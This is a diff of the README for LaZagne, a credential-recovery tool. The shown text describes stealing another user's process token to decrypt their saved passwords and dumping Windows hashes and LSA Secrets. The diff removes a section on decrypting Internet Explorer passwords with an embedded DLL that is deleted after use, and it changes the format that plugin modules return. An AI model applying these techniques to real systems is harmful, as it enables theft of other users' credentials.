@@ -57,11 +57,6 @@ It uses two ways to do that:
 	* If a process from another user is launched (using runas or if many users are connected to the same host), it manages to steal a process token to launch laZagne with its privileges (this is the best way). It could retrieve passwords stored encrypted with the Windows API. 
 	* If no process has been launched but other user exists (visible on the file system in C:\Users\...), it browses the file system in order to retrieve passwords from these users. However, it could not retrieve passwords encrypted with the Windows API (we have to be on the same context as the user to decrypt these passwords). Only few passwords could be retrieved (Firefox, Jitsi, Dbvis, etc.).
 
-IE Browser history
-----
-Internet Explorer passwords (from IE7 and before Windows 8) can only be decrypted using the URL of the website. This one is used as an argument of the Win32CryptUnprotectData api. Thus, using the browsing history of ie will permit to decrypt many passwords. 
-To do that, I used a dll written in C code (the code is in the "browser_history_dll" directory) and it is directly embedded to the Python code as a Base64 string (c.f. ie.py). Once launched, the dll is written on the disk, a wrapper is used to call dll functions and then the dll file is removed from the disk.
-
 Windows hashes
 ----
 To dump windows hashes and LSA Secrets, the impacket library has been used: https://github.com/CoreSecurity/impacket
@@ -77,8 +72,8 @@ To do that, some code standards are to be met:
 
 * Add on the config.manageModules.py file your class name and your import
 
-* The output containing all passwords has to be send to the "print_output" function - ex: print_output(software_name, password_list)
-	* password_list has to be an array of dictionnaries. 
+* The run function has to return an array of dictionnaries
+	* ex: [{"Username": "emiliano", "Password":"ZapaTa", "URL": "http://mail.com"}]
 
 * Optional: you could use the function "print_debug" to print your output 
 	* ex: print_debug("ERROR", "Failed to load ...")
